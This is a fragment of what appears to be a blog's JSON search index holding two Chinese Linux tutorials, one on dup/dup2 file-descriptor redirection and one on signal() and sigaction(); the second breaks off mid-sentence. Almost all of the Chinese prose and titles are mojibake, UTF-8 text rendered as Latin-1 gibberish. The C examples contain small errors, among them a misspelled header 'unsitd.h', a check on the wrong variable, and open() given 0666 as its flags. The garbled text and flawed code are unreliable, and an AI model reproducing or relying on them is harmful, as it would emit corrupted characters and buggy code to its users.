&#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"é€šä¿¡","slug":"é€šä¿¡","permalink":"https://www.sizaif.com/tags/%E9%80%9A%E4%BF%A1/"}],"author":"sizaif"},{"title":"è¿›ç¨‹é—´é€šä¿¡ç®¡é“è¿›é˜¶ç¯‡:Linuxä¸‹dup/dup2å‡½æ•°çš„ç”¨æ³•","slug":"è¿›ç¨‹é—´é€šä¿¡ç®¡é“è¿›é˜¶ç¯‡-linuxä¸‹dup-dup2å‡½æ•°çš„ç”¨æ³•","date":"2022-05-25T08:00:09.000Z","updated":"2022-06-15T07:31:30.834Z","comments":true,"path":"posts/f5e51397/","link":"","permalink":"https://www.sizaif.com/posts/f5e51397/","excerpt":"","text":"ç”±äºåˆ©ç”¨ç®¡é“å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œæ˜¯é€šè¿‡åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä½†æ˜¯æè¿°ç¬¦çš„åˆå§‹åŒ–æ˜¯é€šè¿‡éšæœºçš„ï¼Œå°±æ˜¯ä»å¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ä¸­å–å‡ºï¼Œå¹¶å°†å¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ä¸fileå¯¹è±¡ç›¸å…³è”ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å°†ç®¡é“çš„ä¸¤å¤´ä¸å…¶ä»–çš„æµç›¸å…³æ—¶ï¼Œå°±éœ€è¦é‡å®šå‘æ“ä½œï¼Œé‡å®šå‘fd[0]å’Œfd[1]çš„fileï¼Œä¸‹é¢æ˜¯å…³äºå®ç°é‡å®šå‘çš„å‡½æ•°dupå’Œdup2çš„è§£é‡Šï¼š ç³»ç»Ÿè°ƒç”¨dupå’Œdup2èƒ½å¤Ÿå¤åˆ¶æ–‡ä»¶æè¿°ç¬¦ã€‚dupè¿”å›æ–°çš„æ–‡ä»¶æ–‡ä»¶æè¿°ç¬¦ï¼ˆæ²¡æœ‰ç”¨çš„æ–‡ä»¶æè¿°ç¬¦æœ€å°çš„ç¼–å·ï¼‰ã€‚dup2å¯ä»¥è®©ç”¨æˆ·æŒ‡å®šè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦çš„å€¼ï¼Œå¦‚æœéœ€è¦ï¼Œåˆ™é¦–å…ˆæ¥è¿‘newfdçš„å€¼ï¼Œä»–é€šå¸¸ç”¨æ¥é‡æ–°æ‰“å¼€æˆ–è€…é‡å®šå‘ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ ä»–çš„åŸå‹å¦‚ä¸‹ï¼š #include &lt;unsitd.h> int dup(int oldfd); int dup2(int oldfd,int newfd); dup å’Œdup2éƒ½æ˜¯è¿”å›æ–°çš„æè¿°ç¬¦ã€‚æˆ–è€…è¿”å›-1å¹¶è®¾ç½® errnoå˜é‡ã€‚æ–°è€æè¿°ç¬¦å…±äº«æ–‡ä»¶çš„åç§»é‡ï¼ˆä½ç½®ï¼‰ã€æ ‡å¿—å’Œé”ï¼Œä½†æ˜¯ä¸å…±äº«close-on-execæ ‡å¿—ã€‚ ç›¸ä¿¡å¤§éƒ¨åˆ†åœ¨Unix/Linuxä¸‹ç¼–ç¨‹çš„ç¨‹åºå‘˜æ‰‹å¤´ä¸Šéƒ½æœ‰ã€ŠUnixç¯å¢ƒé«˜çº§ç¼–ç¨‹ã€‹(APUE)è¿™æœ¬è¶…çº§ç»å…¸å·¨è‘—ã€‚ä½œè€…åœ¨è¯¥ä¹¦ä¸­è®²è§£dup/dup2ä¹‹å‰æ›¾ç»è®²è¿‡â€œæ–‡ä»¶å…±äº«â€ï¼Œè¿™å¯¹ç†è§£dup/dup2è¿˜æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚è¿™é‡Œåšç®€å•æ‘˜å½•ä»¥å¤‡åœ¨åé¢çš„åˆ†æä¸­ä½¿ç”¨ï¼š Stevens said: (1) æ¯ä¸ªè¿›ç¨‹åœ¨è¿›ç¨‹è¡¨ä¸­éƒ½æœ‰ä¸€ä¸ªè®°å½•é¡¹ï¼Œæ¯ä¸ªè®°å½•é¡¹ä¸­æœ‰ä¸€å¼ æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œå¯å°†è§†ä¸ºä¸€ä¸ªçŸ¢é‡ï¼Œæ¯ä¸ªæè¿°ç¬¦å ç”¨ä¸€é¡¹ã€‚ä¸æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦ç›¸å…³è”çš„æ˜¯ï¼š (a) æ–‡ä»¶æè¿°ç¬¦æ ‡å¿—ã€‚ (b) æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹çš„æŒ‡é’ˆã€‚ (2) å†…æ ¸ä¸ºæ‰€æœ‰æ‰“å¼€æ–‡ä»¶ç»´æŒä¸€å¼ æ–‡ä»¶è¡¨ã€‚æ¯ä¸ªæ–‡ä»¶è¡¨é¡¹åŒ…å«ï¼š (a) æ–‡ä»¶çŠ¶æ€æ ‡å¿—(è¯»ã€å†™ã€å¢å†™ã€åŒæ­¥ã€éé˜»å¡ç­‰)ã€‚ (b) å½“å‰æ–‡ä»¶ä½ç§»é‡ã€‚ Â© æŒ‡å‘è¯¥æ–‡ä»¶vèŠ‚ç‚¹è¡¨é¡¹çš„æŒ‡é’ˆã€‚ å›¾ç¤ºï¼š æ–‡ä»¶æè¿°ç¬¦è¡¨ ------------ fd0 0 | p0 -------------&gt; æ–‡ä»¶è¡¨0 ---------&gt; vnode0 ------------ fd1 1 | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1 ------------ fd2 2 | p2 ------------ fd3 3 | p3 ------------ â€¦ â€¦ â€¦ â€¦ ------------ ä¸€ã€å•ä¸ªè¿›ç¨‹å†…çš„dupå’Œdup2 å‡è®¾è¿›ç¨‹Aæ‹¥æœ‰ä¸€ä¸ªå·²æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦fd3ï¼Œå®ƒçš„çŠ¶æ€å¦‚ä¸‹ è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(before dup2) ------------ fd0 0 | p0 ------------ fd1 1 | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1 ------------ fd2 2 | p2 ------------ fd3 3 | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2 ------------ â€¦ â€¦ â€¦ â€¦ ------------ ç»ä¸‹é¢è°ƒç”¨ï¼š n_fd = dup2(fd3, STDOUT_FILENO);åè¿›ç¨‹çŠ¶æ€å¦‚ä¸‹ï¼š è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(after dup2) ------------ fd0 0 | p0 ------------ n_fd 1 | p1 ------------ ------------ fd2 2 | p2 ------------ _| fd3 3 | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2 ------------ â€¦ â€¦ â€¦ â€¦ ------------ è§£é‡Šå¦‚ä¸‹ï¼š n_fd = dup2(fd3, STDOUT_FILENO)è¡¨ç¤ºn_fdä¸fd3å…±äº«ä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹(å®ƒä»¬çš„æ–‡ä»¶è¡¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹)ï¼Œn_fdåœ¨æ–‡ä»¶æè¿°ç¬¦è¡¨ä¸­çš„ä½ç½®ä¸º STDOUT_FILENOçš„ä½ç½®ï¼Œè€ŒåŸå…ˆçš„STDOUT_FILENOæ‰€æŒ‡å‘çš„æ–‡ä»¶è¡¨é¡¹è¢«å…³é—­ï¼Œæˆ‘è§‰å¾—ä¸Šå›¾åº”è¯¥å¾ˆæ¸…æ™°çš„åæ˜ å‡ºè¿™ç‚¹ã€‚æŒ‰ç…§ä¸Šé¢çš„è§£é‡Šæˆ‘ä»¬å°±å¯ä»¥è§£é‡ŠCUä¸­æå‡ºçš„ä¸€äº›é—®é¢˜ï¼š (1) â€œdup2çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸æ˜¯å¿…é¡»ä¸ºå·²æ‰“å¼€çš„åˆæ³•filedesï¼Ÿâ€ â€“ ç­”æ¡ˆï¼šå¿…é¡»ã€‚ (2) â€œdup2çš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯ä»»æ„åˆæ³•èŒƒå›´çš„filedeså€¼ä¹ˆï¼Ÿâ€ â€“ ç­”æ¡ˆï¼šå¯ä»¥ï¼Œåœ¨Unixå…¶å–å€¼åŒºé—´ä¸º[0,255]ã€‚ å¦å¤–æ„Ÿè§‰ç†è§£dup2çš„ä¸€ä¸ªå¥½æ–¹æ³•å°±æ˜¯æŠŠfdçœ‹æˆä¸€ä¸ªç»“æ„ä½“ç±»å‹ï¼Œå°±å¦‚ä¸Šé¢å›¾å½¢ä¸­ç”»çš„é‚£æ ·ï¼Œæˆ‘ä»¬ä¸å¦¨æŠŠä¹‹å®šä¹‰ä¸ºï¼š struct fd_t { int index; filelistitem *ptr; }; ç„¶ådup2åŒ¹é…indexï¼Œä¿®æ”¹ptrï¼Œå®Œæˆdup2æ“ä½œã€‚ åœ¨å­¦ä¹ dup2æ—¶æ€»æ˜¯ç¢°åˆ°â€œé‡å®šå‘â€ä¸€è¯ï¼Œä¸Šå›¾å®Œæˆçš„å°±æ˜¯ä¸€ä¸ªâ€œä»æ ‡å‡†è¾“å‡ºåˆ°æ–‡ä»¶çš„é‡å®šå‘â€ï¼Œç»è¿‡dup2åè¿›ç¨‹Açš„ä»»ä½•ç›®æ ‡ä¸ºSTDOUT_FILENOçš„I/Oæ“ä½œå¦‚printfç­‰ï¼Œå…¶æ•°æ®éƒ½å°†æµå…¥fd3æ‰€å¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ç¨‹åºï¼š \\#define TESTSTR \"Hello dup2\\n\" int main() &#123; int fd3; â€‹ fd3 = open(\"testdup2.dat\", 0666); â€‹ if (fd &lt; 0) &#123; â€‹ printf(\"open error\\n\"); â€‹ exit(-1); â€‹ &#125; â€‹ if (dup2(fd3, STDOUT_FILENO) &lt; 0) &#123; â€‹ printf(\"err in dup2\\n\"); â€‹ &#125; â€‹ printf(TESTSTR); â€‹ return 0; &#125; å…¶ç»“æœå°±æ˜¯ä½ åœ¨testdup2.datä¸­çœ‹åˆ°&quot;Hello dup2&quot;ã€‚ äºŒã€é‡å®šå‘åæ¢å¤ CUä¸Šæœ‰è¿™æ ·ä¸€ä¸ªå¸–å­ï¼Œå°±æ˜¯å¦‚ä½•åœ¨é‡å®šå‘åå†æ¢å¤åŸæ¥çš„çŠ¶æ€ï¼Ÿé¦–å…ˆå¤§å®¶éƒ½èƒ½æƒ³åˆ°è¦ä¿å­˜é‡å®šå‘å‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚é‚£ä¹ˆå¦‚ä½•æ¥ä¿å­˜å‘¢ï¼Œè±¡ä¸‹é¢è¿™æ ·è¡Œä¹ˆï¼Ÿ int s_fd = STDOUT_FILENO; int n_fd = dup2(fd3, STDOUT_FILENO); è¿˜æ˜¯è¿™æ ·å¯ä»¥å‘¢ï¼Ÿ int s_fd = dup(STDOUT_FILENO); int n_fd = dup2(fd3, STDOUT_FILENO); è¿™ä¸¤ç§æ–¹æ³•çš„åŒºåˆ«åˆ°åº•åœ¨å“ªå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬äºŒç§æ–¹æ¡ˆæ‰æ˜¯æ­£ç¡®çš„ï¼Œåˆ†æå¦‚ä¸‹ï¼šæŒ‰ç…§ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ä»…ä»…åœ¨&quot;è¡¨é¢ä¸Š&quot;ä¿å­˜äº†ç›¸å½“äºfd_tï¼ˆæŒ‰ç…§æˆ‘å‰é¢è¯´çš„ç†è§£æ–¹æ³•ï¼‰ä¸­çš„indexï¼Œè€Œåœ¨è°ƒç”¨dup2ä¹‹åï¼Œptræ‰€æŒ‡å‘çš„æ–‡ä»¶è¡¨é¡¹ç”±äºè®¡æ•°å€¼å·²ä¸ºé›¶è€Œè¢«å…³é—­äº†ï¼Œæˆ‘ä»¬å¦‚æœå†è°ƒç”¨dup2(s_fd, fd3)å°±ä¼šå‡ºé”™(å‡ºé”™åŸå› ä¸Šé¢æœ‰è§£é‡Š)ã€‚è€Œç¬¬äºŒç§æ–¹æ³•æˆ‘ä»¬é¦–å…ˆåšä¸€ä¸‹å¤åˆ¶ï¼Œå¤åˆ¶åçš„çŠ¶æ€å¦‚ä¸‹å›¾æ‰€ç¤º: è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(after dup) ------------ fd0 0 | p0 ------------ fd1 1 | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1 ------------ /| fd2 2 | p2 / ------------ / fd3 3 | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2 ------------ / s_fd 4 | p4 ------/ ------------ â€¦ â€¦ â€¦ â€¦ ------------ è°ƒç”¨dup2åçŠ¶æ€ä¸ºï¼š è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(after dup2) ------------ fd0 0 | p0 ------------ n_fd 1 | p1 ------------ ------------ fd2 2 | p2 ------------ _| fd3 3 | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2 ------------ s_fd 4 | p4 -------------&gt;æ–‡ä»¶è¡¨1 ---------&gt; vnode1 ------------ â€¦ â€¦ â€¦ â€¦ ------------ dup(fd)çš„è¯­æ„æ˜¯è¿”å›çš„æ–°çš„æ–‡ä»¶æè¿°ç¬¦ä¸fdå…±äº«ä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹ã€‚å°±å¦‚after dupå›¾ä¸­çš„s_fdå’Œfd1å…±äº«æ–‡ä»¶è¡¨1ä¸€æ ·ã€‚ ç¡®å®šç¬¬äºŒä¸ªæ–¹æ¡ˆåé‡å®šå‘åçš„æ¢å¤å°±å¾ˆå®¹æ˜“äº†ï¼Œåªéœ€è°ƒç”¨dup2(s_fd, n_fd);å³å¯ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä¾‹å­ç¨‹åºï¼š #define TESTSTR â€œHello dup2\\nâ€ #define SIZEOFTESTSTR 11 int main() { int fd3; int s_fd; int n_fd; â€‹ fd3 = open(â€œtestdup2.datâ€, 0666); â€‹ if (fd3 &lt; 0) { â€‹ printf(â€œopen error\\nâ€); â€‹ exit(-1); â€‹ } â€‹ â€‹ s_fd = dup(STDOUT_FILENO); â€‹ if (s_fd &lt; 0) { â€‹ printf(â€œerr in dup\\nâ€); â€‹ } â€‹ â€‹ n_fd = dup2(fd3, STDOUT_FILENO); â€‹ if (n_fd &lt; 0) { â€‹ printf(â€œerr in dup2\\nâ€); â€‹ } â€‹ write(STDOUT_FILENO, TESTSTR, SIZEOFTESTSTR); â€‹ â€‹ if (dup2(s_fd, n_fd) &lt; 0) { â€‹ printf(â€œerr in dup2\\nâ€); â€‹ } â€‹ write(STDOUT_FILENO, TESTSTR, SIZEOFTESTSTR); â€‹ return 0; } æ³¨ æ„è¿™é‡Œæˆ‘åœ¨è¾“å‡ºæ•°æ®çš„æ—¶å€™æˆ‘æ˜¯ç”¨äº†ä¸å¸¦ç¼“å†²çš„writeåº“å‡½æ•°ï¼Œå¦‚æœä½¿ç”¨å¸¦ç¼“å†²åŒºçš„printfï¼Œåˆ™æœ€ç»ˆç»“æœä¸ºå±å¹•ä¸Šè¾“å‡ºä¸¤è¡Œ&quot;Hello dup2&quot;ï¼Œè€Œæ–‡ä»¶testdup2.datä¸­ä¸ºç©ºï¼ŒåŸå› å°±æ˜¯ç¼“å†²åŒºä½œæ€ªï¼Œç”±äºæœ€ç»ˆçš„ç›®æ ‡æ˜¯å±å¹•ï¼Œæ‰€ä»¥ç¨‹åºæœ€åå°†ç¼“å†²åŒºçš„å†…å®¹éƒ½è¾“å‡ºåˆ°å±å¹•ã€‚ ä¸‰ã€çˆ¶å­è¿›ç¨‹é—´çš„dup/dup2 ç”±forkè°ƒç”¨å¾—åˆ°çš„å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹çš„ç›¸åŒæ–‡ä»¶æè¿°ç¬¦å…±äº«åŒä¸€æ–‡ä»¶è¡¨é¡¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š çˆ¶è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨ ------------ fd0 0 | p0 ------------ fd1 1 | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1 ------------ /| fd2 2 | p2 | ------------ | | å­è¿›ç¨‹Bçš„æ–‡ä»¶æè¿°ç¬¦è¡¨ fd0 0 ------------ fd1 1 ------------ fd2 2 | p2 ------------ æ‰€ä»¥æ°å½“çš„åˆ©ç”¨dup2å’Œdupå¯ä»¥åœ¨çˆ¶å­è¿›ç¨‹ä¹‹é—´å»ºç«‹ä¸€æ¡â€œæ²Ÿé€šçš„æ¡¥æ¢â€ã€‚è¿™é‡Œä¸è¯¦è¿°ã€‚ å››ã€å°ç»“ çµæ´»çš„åˆ©ç”¨dup/dup2å¯ä»¥ç»™ä½ å¸¦æ¥å¾ˆå¤šå¼ºå¤§çš„åŠŸèƒ½ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´æ€»ç»“å‡ºä¸Šé¢é‚£ä¹ˆå¤šï¼Œä¸çŸ¥é“è‡ªå·±ç†è§£çš„æ˜¯å¦é€å½»ï¼Œåªèƒ½åœ¨ä»¥åçš„å®è·µä¸­æ…¢æ…¢æ¢ç´¢äº†ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"é€šä¿¡","slug":"é€šä¿¡","permalink":"https://www.sizaif.com/tags/%E9%80%9A%E4%BF%A1/"}],"author":"sizaif"},{"title":"Linuxè¿›ç¨‹é—´é€šä¿¡:ä¿¡å· Signal()ã€sigaction()","slug":"Linuxè¿›ç¨‹é—´é€šä¿¡-ä¿¡å·-signal-ã€sigaction","date":"2022-05-25T07:40:38.000Z","updated":"2022-05-25T07:44:56.153Z","comments":true,"path":"posts/e6269028/","link":"","permalink":"https://www.sizaif.com/posts/e6269028/","excerpt":"","text":"https://www.cnblogs.com/52php/p/5813867.html Linuxè¿›ç¨‹é—´é€šä¿¡ï¼ˆä¸€ï¼‰ï¼š ä¿¡å· signal()ã€sigaction() ä¸€ã€ä»€ä¹ˆæ˜¯ä¿¡å· ç”¨è¿‡Windowsçš„æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå½“æˆ‘ä»¬æ— æ³•æ­£å¸¸ç»“æŸä¸€ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥ç”¨ä»»åŠ¡ç®¡ç†å™¨å¼ºåˆ¶ç»“æŸè¿™ä¸ªè¿›ç¨‹ï¼Œä½†è¿™å…¶å®æ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼ŸåŒæ ·çš„åŠŸèƒ½åœ¨Linuxä¸Šæ˜¯é€šè¿‡ç”Ÿæˆä¿¡å·å’Œæ•è·ä¿¡å·æ¥å®ç°çš„ï¼Œè¿è¡Œä¸­çš„è¿›ç¨‹æ•è·åˆ°è¿™ä¸ªä¿¡å·ç„¶åä½œå‡ºä¸€å®šçš„æ“ä½œå¹¶æœ€ç»ˆè¢«ç»ˆæ­¢ã€‚ ä¿¡å·æ˜¯UNIXå’ŒLinuxç³»ç»Ÿå“åº”æŸäº›æ¡ä»¶è€Œäº§ç”Ÿçš„ä¸€ä¸ªäº‹ä»¶ï¼Œæ¥æ”¶åˆ°è¯¥ä¿¡å·çš„è¿›ç¨‹ä¼šç›¸åº”åœ°é‡‡å–ä¸€äº›è¡ŒåŠ¨ã€‚é€šå¸¸ä¿¡å·æ˜¯ç”±ä¸€ä¸ªé”™è¯¯äº§ç”Ÿçš„ã€‚ä½†å®ƒä»¬è¿˜å¯ä»¥ä½œä¸ºè¿›ç¨‹é—´é€šä¿¡æˆ–ä¿®æ”¹è¡Œä¸ºçš„ä¸€ç§æ–¹å¼ï¼Œæ˜ç¡®åœ°ç”±ä¸€ä¸ªè¿›ç¨‹å‘é€ç»™å¦ä¸€ä¸ªè¿›ç¨‹ã€‚ä¸€ä¸ªä¿¡å·çš„äº§ç”Ÿå«ç”Ÿæˆï¼Œæ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·å«æ•è·ã€‚ äºŒã€ä¿¡å·çš„ç§ç±» ä¿¡å·çš„åç§°æ˜¯åœ¨å¤´æ–‡ä»¶signal.hä¸­å®šä¹‰çš„ï¼Œä¿¡å·éƒ½ä»¥SIGå¼€å¤´ï¼Œå¸¸ç”¨çš„ä¿¡å·å¹¶ä¸å¤šï¼Œå¸¸ç”¨çš„ä¿¡å·å¦‚ä¸‹ï¼š æ›´å¤šçš„ä¿¡å·ç±»å‹å¯æŸ¥çœ‹é™„å½•è¡¨ã€‚ ä¸‰ã€ä¿¡å·çš„å¤„ç† â€”â€” signal()å‡½æ•° ç¨‹åºå¯ç”¨ä½¿ç”¨signal()å‡½æ•°æ¥å¤„ç†æŒ‡å®šçš„ä¿¡å·ï¼Œä¸»è¦é€šè¿‡å¿½ç•¥å’Œæ¢å¤å…¶é»˜è®¤è¡Œä¸ºæ¥å·¥ä½œã€‚signal()å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š #include &lt;signal.h&gt; void (*signal(int sig, void (*func)(int)))(int); è¿™æ˜¯ä¸€ä¸ªç›¸å½“å¤æ‚çš„å£°æ˜ï¼Œè€å¿ƒç‚¹çœ‹å¯ä»¥çŸ¥é“signalæ˜¯ä¸€ä¸ªå¸¦æœ‰sigå’Œfuncä¸¤ä¸ªå‚æ•°çš„å‡½æ•°ï¼Œfuncæ˜¯ä¸€ä¸ªç±»å‹ä¸ºvoid (*)(int)çš„å‡½æ•°æŒ‡é’ˆã€‚è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªä¸funcç›¸åŒç±»å‹çš„æŒ‡é’ˆï¼ŒæŒ‡å‘å…ˆå‰æŒ‡å®šä¿¡å·å¤„ç†å‡½æ•°çš„å‡½æ•°æŒ‡é’ˆã€‚å‡†å¤‡æ•è·çš„ä¿¡å·çš„å‚æ•°ç”±sigç»™å‡ºï¼Œæ¥æ”¶åˆ°çš„æŒ‡å®šä¿¡å·åè¦è°ƒç”¨çš„å‡½æ•°ç”±å‚æ•°funcç»™å‡ºã€‚å…¶å®è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨æ˜¯ç›¸å½“ç®€å•çš„ï¼Œé€šè¿‡ä¸‹é¢çš„ä¾‹å­å°±å¯ä»¥çŸ¥é“ã€‚æ³¨æ„ä¿¡å·å¤„ç†å‡½æ•°çš„åŸå‹å¿…é¡»ä¸ºvoid funcï¼ˆintï¼‰ï¼Œæˆ–è€…æ˜¯ä¸‹é¢çš„ç‰¹æ®Šå€¼ï¼š SIG_IGN : å¿½ç•¥ä¿¡å· SIG_DFL : æ¢å¤ä¿¡å·çš„é»˜è®¤è¡Œä¸º è¯´äº†è¿™ä¹ˆå¤šï¼Œè¿˜æ˜¯ç»™å‡ºä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹å§ï¼Œæºæ–‡ä»¶åä¸º signal1.cï¼Œä»£ç å¦‚ä¸‹ï¼š #include &lt;signal.h> #include &lt;stdio.h> #include &lt;unistd.h> void ouch(int sig) &#123; printf(\"\\nOUCH! - I got signal %d\\n\", sig); // æ¢å¤ç»ˆç«¯ä¸­æ–­ä¿¡å·SIGINTçš„é»˜è®¤è¡Œä¸º (void) signal(SIGINT, SIG_DFL); &#125; int main() &#123; // æ”¹å˜ç»ˆç«¯ä¸­æ–­ä¿¡å·SIGINTçš„é»˜è®¤è¡Œä¸ºï¼Œä½¿ä¹‹æ‰§è¡Œouchå‡½æ•° // è€Œä¸æ˜¯ç»ˆæ­¢ç¨‹åºçš„æ‰§è¡Œ (void) signal(SIGINT, ouch); while(1) &#123; printf(\"Hello World!\\n\"); sleep(1); &#125; return 0; &#125; è¿è¡Œç»“æœå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ¬¡æŒ‰ä¸‹ç»ˆæ­¢å‘½ä»¤ï¼ˆctrl+cï¼‰æ—¶ï¼Œè¿›ç¨‹å¹¶æ²¡æœ‰è¢«ç»ˆæ­¢ï¼Œé¢æ˜¯è¾“å‡ºOUCH! - I got signal 2ï¼Œå› ä¸ºSIGINTçš„é»˜è®¤è¡Œä¸ºè¢«signal()å‡½æ•°æ”¹å˜äº†ï¼Œå½“è¿›ç¨‹æ¥å—åˆ°ä¿¡å·SIGINTæ—¶ï¼Œå®ƒå°±å»è°ƒç”¨å‡½æ•°ouchå»å¤„ç†ï¼Œæ³¨æ„ouchå‡½æ•°æŠŠä¿¡å·SIGINTçš„å¤„ç†æ–¹å¼æ”¹å˜æˆé»˜è®¤çš„æ–¹å¼ï¼Œæ‰€ä»¥å½“ä½ å†æŒ‰ä¸€æ¬¡ctrl+cæ—¶ï¼Œè¿›ç¨‹å°±åƒä¹‹å‰é‚£æ ·è¢«ç»ˆæ­¢äº†ã€‚ å››ã€ä¿¡å·å¤„ç† â€”â€” sigaction()å‡½æ•° å‰é¢æˆ‘ä»¬çœ‹åˆ°äº†signal()å‡½æ•°å¯¹ä¿¡å·çš„å¤„ç†ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ›´åŠ å¥å£®çš„ä¿¡å·æ¥å£ â€”â€” sigaction()å‡½æ•°ã€‚å®ƒçš„åŸå‹ä¸ºï¼š #include &lt;signal.h&gt; int sigaction(int sig, const struct sigaction *act, struct sigaction *oact); è¯¥å‡½æ•°ä¸signal()å‡½æ•°ä¸€æ ·ï¼Œç”¨äºè®¾ç½®ä¸ä¿¡å·sigå…³è”çš„åŠ¨ä½œï¼Œè€Œoactå¦‚æœä¸æ˜¯ç©ºæŒ‡é’ˆçš„è¯ï¼Œå°±ç”¨å®ƒæ¥ä¿å­˜åŸå…ˆå¯¹è¯¥ä¿¡å·çš„åŠ¨ä½œçš„ä½ç½®ï¼Œactåˆ™ç”¨äºè®¾ç½®æŒ‡å®šä¿¡å·çš„åŠ¨ä½œã€‚ sigactionç»“æ„ä½“å®šä¹‰åœ¨signal.hä¸­ï¼Œä½†æ˜¯å®ƒè‡³å°‘åŒ…æ‹¬ä»¥ä¸‹æˆå‘˜ï¼š void (*) (int) sa_handlerï¼šå¤„ç†å‡½æ•°æŒ‡é’ˆï¼Œç›¸å½“äºsignalå‡½æ•°çš„funcå‚æ•°ã€‚ sigset_t sa_maskï¼š æŒ‡å®šä¸€ä¸ªã€‚ä¿¡å·é›†ï¼Œåœ¨è°ƒç”¨sa_handleræ‰€æŒ‡å‘çš„ä¿¡å·å¤„ç†å‡½æ•°ä¹‹å‰ï¼Œè¯¥ä¿¡å·é›†å°†è¢«åŠ å…¥åˆ°è¿›ç¨‹çš„ä¿¡å·å±è”½å­—ä¸­ã€‚ä¿¡å·å±è”½å­—æ˜¯æŒ‡å½“å‰è¢«é˜»å¡çš„ä¸€ç»„ä¿¡å·ï¼Œå®ƒä»¬ä¸èƒ½è¢«å½“å‰è¿›ç¨‹æ¥æ”¶åˆ° int sa_flagsï¼šä¿¡å·å¤„ç†ä¿®æ”¹å™¨; sa_mask çš„å€¼é€šå¸¸æ˜¯é€šè¿‡ä½¿ç”¨ä¿¡å·é›†å‡½æ•°æ¥è®¾ç½®çš„ï¼Œå…³äºä¿¡å·é›†å‡½æ•°ï¼Œæˆ‘å°†ä¼šåœ¨æˆ‘çš„ä¸‹ä¸€ç¯‡æ–‡ç«  â€”â€” Linuxè¿›ç¨‹é—´é€šä¿¡â€”â€”ä¿¡å·é›†å‡½æ•°ï¼Œè¯¦ç»†è®²è¿°ã€‚ sa_flagsï¼Œé€šå¸¸å¯ä»¥å–ä»¥ä¸‹çš„å€¼ï¼š æ­¤å¤–ï¼Œç°åœ¨æœ‰ä¸€ä¸ªè¿™æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨signal()æˆ–sigaction()å‡½æ•°æ¥æŒ‡å®šå¤„ç†ä¿¡å·çš„å‡½æ•°ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªä¿¡å·å¤„ç†å‡½æ•°å»ºç«‹ä¹‹å‰å°±æ¥æ”¶åˆ°è¦å¤„ç†çš„ä¿¡å·çš„è¯ï¼Œè¿›ç¨‹ä¼šæœ‰æ€æ 